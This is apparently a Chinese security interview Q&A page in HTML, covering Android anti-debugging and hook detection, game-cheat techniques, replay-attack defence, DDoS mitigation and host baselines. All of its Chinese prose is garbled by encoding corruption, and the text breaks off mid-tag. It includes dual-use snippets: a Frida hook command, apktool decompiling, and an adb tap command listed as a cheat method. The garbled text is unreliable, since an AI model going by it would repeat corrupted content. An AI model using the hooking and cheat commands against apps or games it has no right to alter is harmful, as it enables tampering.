<strong>é˜²æ­¢é‡æ”¾æ”»å‡»</strong>ï¼š<br>   - é‡‡ç”¨ <strong>æ—¶é—´æˆ³ + éšæœºæ•°ï¼ˆnonceï¼‰</strong>ï¼Œç¡®ä¿æ¯æ¬¡è¯·æ±‚å”¯ä¸€ï¼š<br>     <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1700000000</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;nonce&quot;</span><span class="punctuation">:</span> <span class="string">&quot;random-uuid&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;signature&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hmac_signature&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>   - æœåŠ¡å™¨ç«¯å­˜å‚¨ <code>nonce</code>ï¼Œé¿å…ç›¸åŒè¯·æ±‚é‡å¤æäº¤ã€‚</h2><h3 id="å¦‚ä½•è¿›è¡Œå®ä½“æ£€æµ‹ï¼Ÿ"><a href="#å¦‚ä½•è¿›è¡Œå®ä½“æ£€æµ‹ï¼Ÿ" class="headerlink" title="å¦‚ä½•è¿›è¡Œå®ä½“æ£€æµ‹ï¼Ÿ"></a><strong>å¦‚ä½•è¿›è¡Œå®ä½“æ£€æµ‹ï¼Ÿ</strong></h3><p><strong>å®ä½“æ£€æµ‹æ–¹æ³•</strong>ï¼š</p><ol><li><strong>åŸºäºæŒ‡çº¹è¯†åˆ«</strong>ï¼š<ul><li>é€šè¿‡ <strong>è®¾å¤‡ IDã€MAC åœ°å€ã€IMEI</strong> è¿›è¡Œå”¯ä¸€æ€§æ£€æµ‹ã€‚</li></ul></li><li><strong>åŸºäºåœ°ç†ä½ç½®</strong>ï¼š<ul><li>ç»“åˆ GPSã€WiFi ä½ç½®æ•°æ®éªŒè¯å®ä½“å­˜åœ¨æ€§ã€‚</li></ul></li><li><strong>åŸºäºè¡Œä¸ºåˆ†æ</strong>ï¼š<ul><li>é€šè¿‡ <strong>é¼ æ ‡ç§»åŠ¨è½¨è¿¹ã€æ‰“å­—èŠ‚å¥</strong> è¯†åˆ«çœŸå®ç”¨æˆ· vs æœºå™¨äººã€‚</li></ul></li></ol><h2 id="å®‰å…¨æªæ–½ï¼š-é¿å…ä¾èµ–-å•ä¸€æ ‡è¯†ç¬¦ï¼Œç»¼åˆå¤šä¸ªæ•°æ®æºè¿›è¡ŒéªŒè¯ã€‚-é‡‡ç”¨-ç”Ÿç‰©è¯†åˆ«ï¼ˆæŒ‡çº¹ã€äººè„¸ï¼‰å¢å¼ºè®¤è¯å®‰å…¨æ€§ã€‚"><a href="#å®‰å…¨æªæ–½ï¼š-é¿å…ä¾èµ–-å•ä¸€æ ‡è¯†ç¬¦ï¼Œç»¼åˆå¤šä¸ªæ•°æ®æºè¿›è¡ŒéªŒè¯ã€‚-é‡‡ç”¨-ç”Ÿç‰©è¯†åˆ«ï¼ˆæŒ‡çº¹ã€äººè„¸ï¼‰å¢å¼ºè®¤è¯å®‰å…¨æ€§ã€‚" class="headerlink" title="å®‰å…¨æªæ–½ï¼š- é¿å…ä¾èµ– å•ä¸€æ ‡è¯†ç¬¦ï¼Œç»¼åˆå¤šä¸ªæ•°æ®æºè¿›è¡ŒéªŒè¯ã€‚- é‡‡ç”¨ ç”Ÿç‰©è¯†åˆ«ï¼ˆæŒ‡çº¹ã€äººè„¸ï¼‰å¢å¼ºè®¤è¯å®‰å…¨æ€§ã€‚"></a><strong>å®‰å…¨æªæ–½</strong>ï¼š<br>- é¿å…ä¾èµ– <strong>å•ä¸€æ ‡è¯†ç¬¦</strong>ï¼Œç»¼åˆå¤šä¸ªæ•°æ®æºè¿›è¡ŒéªŒè¯ã€‚<br>- é‡‡ç”¨ <strong>ç”Ÿç‰©è¯†åˆ«</strong>ï¼ˆæŒ‡çº¹ã€äººè„¸ï¼‰å¢å¼ºè®¤è¯å®‰å…¨æ€§ã€‚</h2><h3 id="å¸¸è§çš„è°ƒè¯•æ–¹æ³•å’Œæ£€æµ‹æ–¹æ³•ï¼Ÿ"><a href="#å¸¸è§çš„è°ƒè¯•æ–¹æ³•å’Œæ£€æµ‹æ–¹æ³•ï¼Ÿ" class="headerlink" title="å¸¸è§çš„è°ƒè¯•æ–¹æ³•å’Œæ£€æµ‹æ–¹æ³•ï¼Ÿ"></a><strong>å¸¸è§çš„è°ƒè¯•æ–¹æ³•å’Œæ£€æµ‹æ–¹æ³•ï¼Ÿ</strong></h3><p><strong>å¸¸è§è°ƒè¯•æ–¹æ³•</strong>ï¼š</p><ol><li><strong>Logcat è°ƒè¯•</strong>ï¼š<ul><li>é€šè¿‡ <code>adb logcat</code> æŸ¥çœ‹åº”ç”¨æ—¥å¿—ã€‚</li></ul></li><li><strong>åŠ¨æ€ Hook</strong>ï¼š<ul><li>é€šè¿‡ <code>Frida</code> æˆ– <code>Xposed</code> ä¿®æ”¹åº”ç”¨é€»è¾‘ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -n target_app -e <span class="string">&quot;Java.perform(() =&gt; &#123; console.log(&#x27;Hooked!&#x27;); &#125;)&quot;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><strong>Smali é€†å‘ä¿®æ”¹</strong>ï¼š<ul><li>åç¼–è¯‘ <code>apk</code> å¹¶ä¿®æ”¹ <code>smali</code> ä»£ç ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apktool d app.apk</span><br><span class="line">vim smali/com/example/MainActivity.smali</span><br></pre></td></tr></table></figure></li></ul></li></ol><p><strong>è°ƒè¯•æ£€æµ‹æ–¹æ³•</strong>ï¼š</p><ul><li>**æ£€æµ‹ <code>TracerPid</code>**ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;/proc/self/status&quot;</span>));</span><br><span class="line">String line;</span><br><span class="line"><span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (line.contains(<span class="string">&quot;TracerPid&quot;</span>) &amp;&amp; !line.endsWith(<span class="string">&quot;\t0&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Debugging detected!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>æ£€æµ‹ <code>ptrace</code> è¿›ç¨‹</strong>ï¼š<ul><li>åœ¨ <code>Android</code> è®¾å¤‡ä¸Šï¼Œ<code>ptrace</code> åªèƒ½è¢«ä¸€ä¸ªè¿›ç¨‹é™„åŠ ï¼Œåˆ©ç”¨æ­¤ç‰¹æ€§å¯æ£€æµ‹è°ƒè¯•ã€‚</li></ul></li></ul><hr><h3 id="å¦‚ä½•é˜²æ­¢-Fridaã€Xposed-ç­‰æ³¨å…¥æ”»å‡»ï¼Ÿ"><a href="#å¦‚ä½•é˜²æ­¢-Fridaã€Xposed-ç­‰æ³¨å…¥æ”»å‡»ï¼Ÿ" class="headerlink" title="å¦‚ä½•é˜²æ­¢ Fridaã€Xposed ç­‰æ³¨å…¥æ”»å‡»ï¼Ÿ"></a><strong>å¦‚ä½•é˜²æ­¢ Fridaã€Xposed ç­‰æ³¨å…¥æ”»å‡»ï¼Ÿ</strong></h3><h2 id="é˜²å¾¡æ–¹æ³•ï¼š1-æ£€æµ‹-Frida-è¿›ç¨‹ï¼š-é€šè¿‡-proc-net-tcp-æ£€æµ‹-Frida-ç›‘å¬ç«¯å£ï¼š-2-Xposed-Hook-æ£€æµ‹ï¼š-æ£€æµ‹-XposedBridge-jar-æ˜¯å¦å­˜åœ¨ï¼š-3-SELinux-å¼ºåˆ¶æ¨¡å¼ï¼š-è¿è¡Œ-getenforce-å‘½ä»¤ï¼Œç¡®ä¿-SELinux-å¤„äº-Enforcing-æ¨¡å¼ã€‚"><a href="#é˜²å¾¡æ–¹æ³•ï¼š1-æ£€æµ‹-Frida-è¿›ç¨‹ï¼š-é€šè¿‡-proc-net-tcp-æ£€æµ‹-Frida-ç›‘å¬ç«¯å£ï¼š-2-Xposed-Hook-æ£€æµ‹ï¼š-æ£€æµ‹-XposedBridge-jar-æ˜¯å¦å­˜åœ¨ï¼š-3-SELinux-å¼ºåˆ¶æ¨¡å¼ï¼š-è¿è¡Œ-getenforce-å‘½ä»¤ï¼Œç¡®ä¿-SELinux-å¤„äº-Enforcing-æ¨¡å¼ã€‚" class="headerlink" title="é˜²å¾¡æ–¹æ³•ï¼š1. æ£€æµ‹ Frida è¿›ç¨‹ï¼š   - é€šè¿‡ /proc/net/tcp æ£€æµ‹ Frida ç›‘å¬ç«¯å£ï¼š     2. Xposed Hook æ£€æµ‹ï¼š   - æ£€æµ‹ XposedBridge.jar æ˜¯å¦å­˜åœ¨ï¼š     3. SELinux å¼ºåˆ¶æ¨¡å¼ï¼š   - è¿è¡Œ getenforce å‘½ä»¤ï¼Œç¡®ä¿ SELinux å¤„äº Enforcing æ¨¡å¼ã€‚"></a><strong>é˜²å¾¡æ–¹æ³•</strong>ï¼š<br>1. <strong>æ£€æµ‹ Frida è¿›ç¨‹</strong>ï¼š<br>   - é€šè¿‡ <code>/proc/net/tcp</code> æ£€æµ‹ Frida ç›‘å¬ç«¯å£ï¼š<br>     <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;netstat -an&quot;</span>);</span><br></pre></td></tr></table></figure><br>2. <strong>Xposed Hook æ£€æµ‹</strong>ï¼š<br>   - æ£€æµ‹ <code>XposedBridge.jar</code> æ˜¯å¦å­˜åœ¨ï¼š<br>     <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">xposed</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/system/framework/XposedBridge.jar&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (xposed.exists()) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Xposed detected!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>3. <strong>SELinux å¼ºåˆ¶æ¨¡å¼</strong>ï¼š<br>   - è¿è¡Œ <code>getenforce</code> å‘½ä»¤ï¼Œç¡®ä¿ <code>SELinux</code> å¤„äº <code>Enforcing</code> æ¨¡å¼ã€‚</h2><h3 id="å¦‚ä½•é˜²æ­¢å½“å‰è®¾å¤‡çš„æ•°æ®æ‹·è´åˆ°å…¶ä»–è®¾å¤‡ï¼Ÿ"><a href="#å¦‚ä½•é˜²æ­¢å½“å‰è®¾å¤‡çš„æ•°æ®æ‹·è´åˆ°å…¶ä»–è®¾å¤‡ï¼Ÿ" class="headerlink" title="å¦‚ä½•é˜²æ­¢å½“å‰è®¾å¤‡çš„æ•°æ®æ‹·è´åˆ°å…¶ä»–è®¾å¤‡ï¼Ÿ"></a><strong>å¦‚ä½•é˜²æ­¢å½“å‰è®¾å¤‡çš„æ•°æ®æ‹·è´åˆ°å…¶ä»–è®¾å¤‡ï¼Ÿ</strong></h3><h2 id="é˜²å¾¡æªæ–½ï¼š1-æ–‡ä»¶æƒé™æ§åˆ¶ï¼š-Android-é™åˆ¶æ–‡ä»¶è®¿é—®ï¼š-2-è®¾å¤‡ç»‘å®šæœºåˆ¶ï¼š-ç»“åˆ-Device-ID-ç”¨æˆ·-ID-è¿›è¡Œæ•°æ®ç»‘å®šï¼š-3-é˜»æ­¢-ADB-è®¿é—®ï¼š-ç›‘å¬-adb-è¿æ¥çŠ¶æ€ï¼š"><a href="#é˜²å¾¡æªæ–½ï¼š1-æ–‡ä»¶æƒé™æ§åˆ¶ï¼š-Android-é™åˆ¶æ–‡ä»¶è®¿é—®ï¼š-2-è®¾å¤‡ç»‘å®šæœºåˆ¶ï¼š-ç»“åˆ-Device-ID-ç”¨æˆ·-ID-è¿›è¡Œæ•°æ®ç»‘å®šï¼š-3-é˜»æ­¢-ADB-è®¿é—®ï¼š-ç›‘å¬-adb-è¿æ¥çŠ¶æ€ï¼š" class="headerlink" title="é˜²å¾¡æªæ–½ï¼š1. æ–‡ä»¶æƒé™æ§åˆ¶ï¼š   - Android é™åˆ¶æ–‡ä»¶è®¿é—®ï¼š     2. è®¾å¤‡ç»‘å®šæœºåˆ¶ï¼š   - ç»“åˆ Device ID + ç”¨æˆ· ID è¿›è¡Œæ•°æ®ç»‘å®šï¼š     3. é˜»æ­¢ ADB è®¿é—®ï¼š   - ç›‘å¬ adb è¿æ¥çŠ¶æ€ï¼š     "></a><strong>é˜²å¾¡æªæ–½</strong>ï¼š<br>1. <strong>æ–‡ä»¶æƒé™æ§åˆ¶</strong>ï¼š<br>   - Android é™åˆ¶æ–‡ä»¶è®¿é—®ï¼š<br>     <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getFilesDir(), <span class="string">&quot;data.txt&quot;</span>);</span><br><span class="line">file.setReadable(<span class="literal">false</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><br>2. <strong>è®¾å¤‡ç»‘å®šæœºåˆ¶</strong>ï¼š<br>   - ç»“åˆ <code>Device ID + ç”¨æˆ· ID</code> è¿›è¡Œæ•°æ®ç»‘å®šï¼š<br>     <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;device_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;abcd1234&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;user_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user5678&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>3. <strong>é˜»æ­¢ ADB è®¿é—®</strong>ï¼š<br>   - ç›‘å¬ <code>adb</code> è¿æ¥çŠ¶æ€ï¼š<br>     <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">adbStatus</span> <span class="operator">=</span> Settings.Global.getString(getContentResolver(), Settings.Global.ADB_ENABLED);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;1&quot;</span>.equals(adbStatus)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;ADB detected!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></h2><h3 id="å¤–æŒ‚æœ‰å‡ ç§ç±»å‹çš„å®ç°æ–¹å¼ï¼Ÿ"><a href="#å¤–æŒ‚æœ‰å‡ ç§ç±»å‹çš„å®ç°æ–¹å¼ï¼Ÿ" class="headerlink" title="å¤–æŒ‚æœ‰å‡ ç§ç±»å‹çš„å®ç°æ–¹å¼ï¼Ÿ"></a><strong>å¤–æŒ‚æœ‰å‡ ç§ç±»å‹çš„å®ç°æ–¹å¼ï¼Ÿ</strong></h3><p><strong>å¤–æŒ‚ç±»å‹</strong>ï¼š</p><ol><li><strong>ä¿®æ”¹æ¸¸æˆå†…å­˜</strong>ï¼š<ul><li>é€šè¿‡ <code>Frida</code> æˆ– <code>Cheat Engine</code> ä¿®æ”¹æ¸¸æˆæ•°æ®ã€‚</li></ul></li><li><strong>æ³¨å…¥ DLL</strong>ï¼š<ul><li>åœ¨ <code>Windows</code> æˆ– <code>Android</code> ä¸Šï¼Œæ”»å‡»è€…å¯å‘æ¸¸æˆè¿›ç¨‹æ³¨å…¥åŠ¨æ€åº“ (<code>.dll</code> æˆ– <code>.so</code>)ã€‚</li></ul></li><li><strong>æ¨¡æ‹Ÿç‚¹å‡»</strong>ï¼š<ul><li>é€šè¿‡ <code>Auto.js</code> æˆ– <code>ADB</code> è‡ªåŠ¨åŒ–ç‚¹å‡»ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell input tap 500 500</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>ç½‘ç»œå°åŒ…ä¿®æ”¹</strong>ï¼š<ul><li>é€šè¿‡ <code>Burp Suite</code> æˆªå– HTTP è¯·æ±‚ï¼Œä¿®æ”¹æ¸¸æˆæ•°æ®åŒ…ã€‚</li></ul></li></ol><h2 id="é˜²å¾¡æªæ–½ï¼š-æ£€æµ‹å†…å­˜ä¿®æ”¹ï¼Œå¯ç”¨-Integrity-Checkã€‚-ä½¿ç”¨æœåŠ¡å™¨éªŒè¯å…³é”®æ•°æ®ï¼Œé¿å…å®¢æˆ·ç«¯ç¯¡æ”¹ã€‚"><a href="#é˜²å¾¡æªæ–½ï¼š-æ£€æµ‹å†…å­˜ä¿®æ”¹ï¼Œå¯ç”¨-Integrity-Checkã€‚-ä½¿ç”¨æœåŠ¡å™¨éªŒè¯å…³é”®æ•°æ®ï¼Œé¿å…å®¢æˆ·ç«¯ç¯¡æ”¹ã€‚" class="headerlink" title="é˜²å¾¡æªæ–½ï¼š- æ£€æµ‹å†…å­˜ä¿®æ”¹ï¼Œå¯ç”¨ Integrity Checkã€‚- ä½¿ç”¨æœåŠ¡å™¨éªŒè¯å…³é”®æ•°æ®ï¼Œé¿å…å®¢æˆ·ç«¯ç¯¡æ”¹ã€‚"></a><strong>é˜²å¾¡æªæ–½</strong>ï¼š<br>- <strong>æ£€æµ‹å†…å­˜ä¿®æ”¹</strong>ï¼Œå¯ç”¨ <strong>Integrity Check</strong>ã€‚<br>- <strong>ä½¿ç”¨æœåŠ¡å™¨éªŒè¯å…³é”®æ•°æ®</strong>ï¼Œé¿å…å®¢æˆ·ç«¯ç¯¡æ”¹ã€‚</h2><h3 id="å¦‚ä½•é¿å…æœªç»ç”¨æˆ·æˆæƒè·å–æƒé™ï¼Ÿ"><a href="#å¦‚ä½•é¿å…æœªç»ç”¨æˆ·æˆæƒè·å–æƒé™ï¼Ÿ" class="headerlink" title="å¦‚ä½•é¿å…æœªç»ç”¨æˆ·æˆæƒè·å–æƒé™ï¼Ÿ"></a><strong>å¦‚ä½•é¿å…æœªç»ç”¨æˆ·æˆæƒè·å–æƒé™ï¼Ÿ</strong></h3><p><strong>é˜²å¾¡ç­–ç•¥</strong>ï¼š</p><ol><li><strong>æƒé™æœ€å°åŒ–åŸåˆ™</strong>ï¼š<ul><li>ä»…ç”³è¯·å¿…è¦æƒé™ï¼Œé¿å…ç”¨æˆ·è­¦è§‰ï¼š<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.CAMERA&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><strong>åŠ¨æ€æƒé™ç”³è¯·</strong>ï¼š<ul><li>è¿è¡Œæ—¶è¯·æ±‚æƒé™ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ContextCompat.checkSelfPermission(<span class="built_in">this</span>, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">    ActivityCompat.requestPermissions(<span class="built_in">this</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;Manifest.permission.READ_CONTACTS&#125;, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>æƒé™ä½¿ç”¨é€æ˜åŒ–</strong>ï¼š<ul><li>åœ¨ UI æç¤ºç”¨æˆ·æƒé™ç”¨é€”ï¼Œå¢å¼ºä¿¡ä»»æ„Ÿã€‚</li></ul></li></ol><h2 id="åŸºç¡€è®¾æ–½å®‰å…¨å²—"><a href="#åŸºç¡€è®¾æ–½å®‰å…¨å²—" class="headerlink" title="åŸºç¡€è®¾æ–½å®‰å…¨å²—"></a>åŸºç¡€è®¾æ–½å®‰å…¨å²—</h2><h3 id="DDoS-CC-å¦‚ä½•æœ‰æ•ˆé˜²å¾¡ä¸åº”æ€¥ï¼Ÿ"><a href="#DDoS-CC-å¦‚ä½•æœ‰æ•ˆé˜²å¾¡ä¸åº”æ€¥ï¼Ÿ" class="headerlink" title="DDoS&#x2F;CC å¦‚ä½•æœ‰æ•ˆé˜²å¾¡ä¸åº”æ€¥ï¼Ÿ"></a><strong>DDoS&#x2F;CC å¦‚ä½•æœ‰æ•ˆé˜²å¾¡ä¸åº”æ€¥ï¼Ÿ</strong></h3><p><strong>é˜²å¾¡æªæ–½</strong>ï¼š</p><ol><li><p><strong>åŸºç¡€é˜²æŠ¤</strong>ï¼š</p><ul><li>å¯ç”¨ <strong>WAFï¼ˆWeb åº”ç”¨é˜²ç«å¢™ï¼‰</strong>ï¼Œè¿‡æ»¤æ¶æ„æµé‡ã€‚</li><li>é™åˆ¶ <strong>åŒä¸€ IP è®¿é—®é¢‘ç‡</strong>ï¼Œé˜²æ­¢ CC æ”»å‡»ï¼š<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">limit_req_zone</span> <span class="variable">$binary_remote_addr</span> zone=one:<span class="number">10m</span> rate=5r/s;</span><br></pre></td></tr></table></figure></li><li>å¯ç”¨ <strong>CDN</strong>ï¼ˆå¦‚ Cloudflareï¼‰ç¼“è§£æ”»å‡»ã€‚</li></ul></li><li><p><strong>é«˜çº§é˜²æŠ¤</strong>ï¼š</p><ul><li>é‡‡ç”¨ <strong>æµé‡æ¸…æ´—</strong>ï¼ˆå¦‚é˜¿é‡Œäº‘ DDoS é˜²æŠ¤ï¼‰ã€‚</li><li>é…ç½® <strong>é»‘æ´è·¯ç”±</strong>ï¼Œä¸¢å¼ƒå¼‚å¸¸æµé‡ã€‚</li></ul></li></ol><h2 id="åº”æ€¥æ–¹æ¡ˆï¼š-ç«‹å³å°ç¦æ”»å‡»-IPï¼š-åˆ‡æ¢å¤‡ç”¨æœåŠ¡å™¨ï¼Œé˜²æ­¢ä¸šåŠ¡ä¸­æ–­ã€‚"><a href="#åº”æ€¥æ–¹æ¡ˆï¼š-ç«‹å³å°ç¦æ”»å‡»-IPï¼š-åˆ‡æ¢å¤‡ç”¨æœåŠ¡å™¨ï¼Œé˜²æ­¢ä¸šåŠ¡ä¸­æ–­ã€‚" class="headerlink" title="åº”æ€¥æ–¹æ¡ˆï¼š- ç«‹å³å°ç¦æ”»å‡» IPï¼š  - åˆ‡æ¢å¤‡ç”¨æœåŠ¡å™¨ï¼Œé˜²æ­¢ä¸šåŠ¡ä¸­æ–­ã€‚"></a><strong>åº”æ€¥æ–¹æ¡ˆ</strong>ï¼š<br>- ç«‹å³å°ç¦æ”»å‡» IPï¼š<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -s &lt;malicious_ip&gt; -j DROP</span><br></pre></td></tr></table></figure><br>- åˆ‡æ¢å¤‡ç”¨æœåŠ¡å™¨ï¼Œé˜²æ­¢ä¸šåŠ¡ä¸­æ–­ã€‚</h2><h3 id="å¦‚ä½•å¯¹ç½‘ç»œåŒºåŸŸè¿›è¡Œåˆ’åˆ†ï¼Ÿ"><a href="#å¦‚ä½•å¯¹ç½‘ç»œåŒºåŸŸè¿›è¡Œåˆ’åˆ†ï¼Ÿ" class="headerlink" title="å¦‚ä½•å¯¹ç½‘ç»œåŒºåŸŸè¿›è¡Œåˆ’åˆ†ï¼Ÿ"></a><strong>å¦‚ä½•å¯¹ç½‘ç»œåŒºåŸŸè¿›è¡Œåˆ’åˆ†ï¼Ÿ</strong></h3><p><strong>ç½‘ç»œåˆ†åŒºåŸåˆ™</strong>ï¼š</p><ol><li><p><strong>æŒ‰ç…§å®‰å…¨ç­‰çº§åˆ’åˆ†</strong>ï¼š</p><ul><li><strong>DMZï¼ˆéå†›äº‹åŒºï¼‰</strong>ï¼šå¯¹å¤–æš´éœ²çš„æœåŠ¡ï¼ˆå¦‚ Web æœåŠ¡å™¨ï¼‰ã€‚</li><li><strong>å†…éƒ¨ç½‘ç»œï¼ˆLANï¼‰</strong>ï¼šä¼ä¸šå†…éƒ¨ç³»ç»Ÿï¼ˆå¦‚æ•°æ®åº“ã€æ–‡ä»¶æœåŠ¡å™¨ï¼‰ã€‚</li><li><strong>éš”ç¦»åŒº</strong>ï¼šå­˜æ”¾æ•æ„Ÿæ•°æ®ï¼Œé™åˆ¶è®¿é—®æƒé™ã€‚</li></ul></li><li><p><strong>VLANï¼ˆè™šæ‹Ÿå±€åŸŸç½‘ï¼‰</strong>ï¼š</p><ul><li>ä½¿ç”¨ <strong>VLAN</strong> è¿›è¡Œé€»è¾‘éš”ç¦»ï¼Œé˜²æ­¢å¹¿æ’­é£æš´ã€‚</li></ul></li></ol><hr><h3 id="ç»å…¸ç½‘ç»œä¸-VPC-çš„ä¼˜åŠ¿"><a href="#ç»å…¸ç½‘ç»œä¸-VPC-çš„ä¼˜åŠ¿" class="headerlink" title="ç»å…¸ç½‘ç»œä¸ VPC çš„ä¼˜åŠ¿"></a><strong>ç»å…¸ç½‘ç»œä¸ VPC çš„ä¼˜åŠ¿</strong></h3><table><thead><tr><th><strong>å¯¹æ¯”é¡¹</strong></th><th><strong>ç»å…¸ç½‘ç»œ</strong></th><th><strong>VPCï¼ˆVirtual Private Cloudï¼‰</strong></th></tr></thead><tbody><tr><td><strong>éš”ç¦»æ€§</strong></td><td>å…±äº«ç½‘ç»œ</td><td>ç‹¬ç«‹ç§æœ‰ç½‘ç»œ</td></tr><tr><td><strong>å®‰å…¨æ€§</strong></td><td>è¾ƒä½</td><td>æ›´é«˜ï¼ˆå¯é…ç½®å­ç½‘ã€ACLã€NACLï¼‰</td></tr><tr><td><strong>æ‰©å±•æ€§</strong></td><td>å—é™</td><td>å¯çµæ´»å®šä¹‰å­ç½‘ã€è·¯ç”±</td></tr><tr><td><strong>é€‚ç”¨åœºæ™¯</strong></td><td>ä¼ ç»Ÿæ•°æ®ä¸­å¿ƒ</td><td>äº‘è®¡ç®—ã€æ··åˆäº‘</td></tr></tbody></table><hr><h3 id="ä¸»æœºæœ€é‡è¦çš„åŸºçº¿æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#ä¸»æœºæœ€é‡è¦çš„åŸºçº¿æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ä¸»æœºæœ€é‡è¦çš„åŸºçº¿æ˜¯ä»€ä¹ˆï¼Ÿ"></a><strong>ä¸»æœºæœ€é‡è¦çš„åŸºçº¿æ˜¯ä»€ä¹ˆï¼Ÿ</strong></h3><h2 id="å®‰å…¨åŸºçº¿ï¼š1-æœ€å°æƒé™åŸåˆ™ï¼š-å…³é—­ä¸å¿…è¦çš„æœåŠ¡ï¼š-2-æ—¥å¿—å®¡è®¡ï¼š-å¯ç”¨-auditd-è®°å½•å…³é”®æ“ä½œï¼š-3-è®¿é—®æ§åˆ¶ï¼š-ä»…å…è®¸ç‰¹å®š-IP-ç™»å½•ï¼š"><a href="#å®‰å…¨åŸºçº¿ï¼š1-æœ€å°æƒé™åŸåˆ™ï¼š-å…³é—­ä¸å¿…è¦çš„æœåŠ¡ï¼š-2-æ—¥å¿—å®¡è®¡ï¼š-å¯ç”¨-auditd-è®°å½•å…³é”®æ“ä½œï¼š-3-è®¿é—®æ§åˆ¶ï¼š-ä»…å…è®¸ç‰¹å®š-IP-ç™»å½•ï¼š" class="headerlink" title="å®‰å…¨åŸºçº¿ï¼š1. æœ€å°æƒé™åŸåˆ™ï¼š   - å…³é—­ä¸å¿…è¦çš„æœåŠ¡ï¼š     2. æ—¥å¿—å®¡è®¡ï¼š   - å¯ç”¨ auditd è®°å½•å…³é”®æ“ä½œï¼š     3. è®¿é—®æ§åˆ¶ï¼š   - ä»…å…è®¸ç‰¹å®š IP ç™»å½•ï¼š     "></a><strong>å®‰å…¨åŸºçº¿</strong>ï¼š<br>1. <strong>æœ€å°æƒé™åŸåˆ™</strong>ï¼š<br>   - å…³é—­ä¸å¿…è¦çš„æœåŠ¡ï¼š<br>     <figure class="highlight bash"><table><tr><td class="gutter"><pre><span 